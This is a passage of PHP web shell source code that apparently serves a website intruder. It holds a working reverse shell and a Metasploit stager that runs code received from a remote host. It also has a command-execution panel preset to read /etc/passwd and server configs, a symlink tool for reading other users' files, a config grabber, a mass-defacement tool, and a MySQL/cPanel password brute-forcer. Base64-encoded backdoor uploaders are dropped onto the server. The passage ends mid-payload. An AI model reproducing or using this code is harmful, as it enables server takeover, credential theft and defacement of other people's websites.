$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = "443";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = "<br><br><br><center><table><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='tool'><table class='tabnet'><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='".$rstarget4."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='".$rsportb4."' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='".$pwd."' /></form></td><td><hr color='#4C83AF'><td><td><form method='POST'><table class='tabnet'><h2>Metasploit Connection </h2><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='".$my_ip."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center></table><br><br />";
echo $s_result;
if($_POST['metaConnect']){$ipaddr = $_POST['yip'];$port = $_POST['yport'];if ($ip == "" && $port == ""){echo "fill in the blanks";}else {if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}if (is_callable('stream_socket_client')){$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");if (!$msgsock){die();}$msgsock_type = 'stream';}elseif (is_callable('fsockopen')){$msgsock = fsockopen($ipaddr,$port);if (!$msgsock) {die(); }$msgsock_type = 'stream';}elseif (is_callable('socket_create')){$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);$res = socket_connect($msgsock, $ipaddr, $port);if (!$res) {die(); }$msgsock_type = 'socket';}else {die();}switch ($msgsock_type){case 'stream': $len = fread($msgsock, 4); break;case 'socket': $len = socket_read($msgsock, 4); break;}if (!$len) {die();}$a = unpack("Nlen", $len);$len = $a['len'];$buffer = '';while (strlen($buffer) < $len){switch ($msgsock_type) {case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));break;}}eval($buffer);echo "[*] Connection Terminated";die();}}
if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);
if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);
if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/sh';$daemon = 0;$debug = 0;if(function_exists('pcntl_fork')){$pid = pcntl_fork();
if ($pid == -1) exit(1);if ($pid) exit(0);if (posix_setsid() == -1) exit(1);$daemon = 1;}
umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) exit(1);
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if(!is_resource($process)) exit(1);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while(1){if(feof($sock)) break;if(feof($pipes[1])) break;$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
if(in_array($sock, $read_a)){$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}
if(in_array($pipes[1], $read_a)){$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}
}
////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'mail')){
if(isset($_POST['mail_send'])){
	$mail_to = $_POST['mail_to'];
	$mail_from = $_POST['mail_from'];
	$mail_subject = $_POST['mail_subject'];
	$mail_content = magicboom($_POST['mail_content']);
	if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from")){
		$msg = "email sent to $mail_to";
	}
	else $msg = "send email failed";
}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post">
<table class="cmdbox">
<tr><td>
<textarea class="output" name="mail_content" id="cmd" style="height:340px;"><b>patch me ASAP</b></textarea>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com" name="mail_to" />&nbsp; mail to</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="Shu <shu@indonesianhacker.org>" name="mail_from" />&nbsp; from</td></tr>
<tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="Warn!" name="mail_subject" />&nbsp; subject</td></tr>
<tr><td>&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr></form>
<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?></td></tr>
</table>
</form>
<?php }

elseif(isset($_GET['view']) && ($_GET['view'] != "")){
  if(is_file($_GET['view'])){ 
	if(!isset($file)) $file = magicboom($_GET['view']);
	if(!$win && $posix){
		$name=@posix_getpwuid(@fileowner($folder));
		$group=@posix_getgrgid(@filegroup($folder));
		$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
	}
	else {
		$owner = $user;
	}
	$filn = basename($file);
	echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\">
	<tr><td>Filename</td><td><span id=\"".clearspace($filn)."_link\">".$file."</span>
	<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" />
	</form>
	</td></tr>
	<tr><td>Size</td><td>".ukuran($file)."</td></tr>
	<tr><td>Permission</td><td>".get_perms($file)."</td></tr>
	<tr><td>Owner</td><td>".$owner."</td></tr>
	<tr><td>Create time</td><td>".date("d-M-Y H:i",@filectime($file))."</td></tr>
	<tr><td>Last modified</td><td>".date("d-M-Y H:i",@filemtime($file))."</td></tr>
	<tr><td>Last accessed</td><td>".date("d-M-Y H:i",@fileatime($file))."</td></tr>
	<tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr>
	<tr><td>View</td><td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">image</a></td></tr>
	</table>
	";
	if(isset($_GET['type']) && ($_GET['type']=='image')){
		echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>";
	}
	elseif(isset($_GET['type']) && ($_GET['type']=='code')){
		echo "<div class=\"viewfile\">";
		$file = wordwrap(@file_get_contents($file),"240","\n");
		@highlight_string($file);
		echo "</div>";
	}
	else {
		echo "<div class=\"viewfile\">";
		echo nl2br(htmlentities((@file_get_contents($file))));
		echo "</div>";
	}
  }
  elseif(is_dir($_GET['view'])){
		echo showdir($pwd,$prompt);
  }
	
}
elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){

		if(isset($_POST['save'])){
			$file = $_POST['saveas'];
			$content = magicboom($_POST['content']);
			if($filez = @fopen($file,"w")){
				$time = date("d-M-Y H:i",time());
				if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time;
				else $msg = "failed to save";
				@fclose($filez);
			}
			else $msg = "permission denied";
		}
		if(!isset($file)) $file = $_GET['edit'];
		if($filez = @fopen($file,"r")){
			$content = "";
			while(!feof($filez)){
				$content .= htmlentities(str_replace("''","'",fgets($filez)));
			}
			@fclose($filez);
		}
	
?>
<form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" name="content">
<?php echo $content; ?>
</textarea>
<tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" />
&nbsp;<?php echo $msg; ?></td></tr>
</table>
</form>
<?php
}

/////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'hash'))
    {
$submit= $_POST['enter'];
if (isset($submit)) {
$pass = $_POST['password']; // password
$salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
$hash = md5($pass); // md5 hash #1
$md4 = hash("md4",$pass);
$hash_md5 = md5($salt.$pass); // md5 hash with salt #2
$hash_md5_double = md5(sha1($salt.$pass)); // md5 hash with salt & sha1 #3
$hash1 = sha1($pass); // sha1 hash #4
$sha256 = hash("sha256",$text);
$hash1_sha1 = sha1($salt.$pass); // sha1 hash with salt #5
$hash1_sha1_double = sha1(md5($salt.$pass)); // sha1 hash with salt & md5 #6
}
echo '<br><center><h1>Password Hash</h1></center><div class=content>';
echo '<form action="" method="post"><b><table class=tabnet>';
echo '<tr><th colspan="2">Password Hash</th></center></tr>';
echo '<tr><td><b>Input here :</b></td>';
echo '<td><input class="inputz" type="text" name="password" size="40" />';
echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
echo '</td></tr><br>';
echo '<tr><th colspan="2">Hasil Hash</th></center></tr>';
echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value='.$pass.'></td></tr>';
echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value='.$hash.'></td></tr>';
echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value='.$md4.'></td></tr>';
echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value='.$hash_md5.'></td></tr>';
echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value='.$hash_md5_double.'></td></tr>';
echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value='.$hash1.'></td></tr>';
echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value='.$sha256.'></td></tr>';
echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value='.$hash1_sha1.'></td></tr>';
echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value='.$hash1_sha1_double.'></td></tr></table>'; 
}
// symlink function
elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post">

<?php   

@set_time_limit(0);

echo "<br><br><center><h1>Symlink Server</h1></center><br><br><center><div class=content>";

@mkdir('shu',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('shu/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','shu/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','nginx1337/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
$malay	= '\.my';
$china	= '\.cn';
$japan	= '\.jp';
$austr	= '\.au';
$porn	= '\.xxx';
$as		= '\.uk';
$calfn	= '\.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='nginx1337/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}

// config grabber
elseif(isset($_GET['x']) && ($_GET['x'] == 'config'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=config" method="post">

<?php

echo "<center/><br/><b><font color=#00ff00>ConfKiller</font></b><br><br>";

  mkdir('pwnz', 0755);
    chdir('pwnz');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Error Bajingan !!!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
		
AddType application/x-httpd-cgi .cpc

AddHandler cgi-script .cc
AddHandler cgi-script .cc";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);

$file = fopen("grab.cc" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
    chmod("grab.cc",0755);
   echo "<iframe src=pwnz/grab.cc width=97% height=100% frameborder=0></iframe>
   </div>"; 
}
///////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'bypass')) 
{ 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=bypass" method="post">

<?php
echo "<center/><br/><b><font color=#00ff00>Command Bypass Exploit</font></b><br>
";
print_r('
<pre>
<form method="POST" action="">
<b><font color=#00ff00><b><font color="#00ff00">root@inori:~#</font></font></b><input name="baba" type="text" class="inputz" size="34"><input type="submit" class="inputzbut" value="Go">
</form>
<form method="POST" action=""><strong><b><font color="#00ff00">Menu Bypass : </font></strong><select name="liz0" size="1" class="inputz">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" class="inputzbut" value="G&ouml;">
</form>
</pre>
');
ini_restore("safe_mode");
ini_restore("open_basedir");
$liz0=shell_exec($_POST[baba]); 
$liz0zim=shell_exec($_POST[liz0]); 
$uid=shell_exec('id');
$server=shell_exec('uname -a');
echo "<pre><h4>";

echo $liz0;
echo $liz0zim;
echo "</h4></pre>";
 "</div>"; }

////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'domain'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=domain" method="post">

<?php

echo '<br><br><center><h1>Local Domain Viewer</h1></center><br><br><div class=content>';

$file = @implode(@file("/etc/named.conf"));
if(!$file){ die("# can't ReaD -> [ /etc/named.conf ]"); }
preg_match_all("#named/(.*?).db#",$file ,$r);
$domains = array_unique($r[1]);
//check();
//if(isset($_GET['ShowAll']))
{
echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>[+] There are : [ <b>".count($domains)."</b> ] Domain</td></tr>
<tr><td>Domain</td><td>User</td></tr>";
foreach($domains as $domain){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));

		echo "<tr><td>$domain</td><td>".$user['name']."</td></tr>";
		}
	echo "</table>";
	}

echo '</div>';
}



//////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'mass'))
{
echo "<center/><br/><b><font color=#00ff00>Mass Directory</font></b><br>";
error_reporting(0);?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']?>" method='post'>
<td><table><table class="tabnet" >
<form hethot='post'>
<tr>
	<tr>
	<td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd();?>"></td>
	</tr><br>
	<tr>
	<td>file name</td><td><input class ='inputz' type='text' name='file' size='60' value="shu.html"></td>
	</tr>
</tr>
<th colspan='2'><b>hacked code</b></th><br></table>
<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'><html><title>owned by shu1337</title><center>Even if I'm just a fake.. To me, I'm the only.. real one!<br><b>Hacked by Shu</b></center></html></textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>

<?php $mainpath=$_POST[path];$file=$_POST[file];$dir=opendir("$mainpath");$code=base64_encode($_POST[index]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if ($finish){echo "$row/$file > Done<br><br>";}}}
////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'jembut'))
			{	
			?>
				<form action="?y=<?php echo $pwd; ?>&amp;x=jembut" method="post">
			<?php
			//bruteforce
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
/*
Recoded By Nabilaholic
*/
@set_time_limit(0);
@error_reporting(0);


if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "Elsa~ user is (<b><font color=white>$user</font></b>) Password is (<b><font color=red>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>You Found <font color=green>$ok</font> Cpanel by Shu</b>";
    echo "<center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
    exit;
}
}
if($_POST['pass']=='password'){
@error_reporting(0);
$i = getenv('REMOTE_ADDR');
$d = date('D, M jS, Y H:i',time());
$h = $_SERVER['HTTP_HOST'];
$dir=$_SERVER['PHP_SELF'];
$back = "PD9waHANCmVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7DQplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsNCmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsNCmlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7IGVjaG8gJzxiPktvcmFuZyBEYWggQmVyamF5YSBVcGxvYWQgU2hlbGwgS29yYW5nISEhPGI+PGJyPjxicj4nOyB9DQplbHNlIHsgZWNobyAnPGI+S29yYW5nIEdhZ2FsIFVwbG9hZCBTaGVsbCBLb3JhbmchISE8L2I+PGJyPjxicj4nOyB9DQp9DQo/Pg==";
$file = fopen(".php","w+");
$write = fwrite ($file ,base64_decode($back));
fclose($file);
chmod(".php",0755);
mkdir('config',0755);
$cp =
'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQ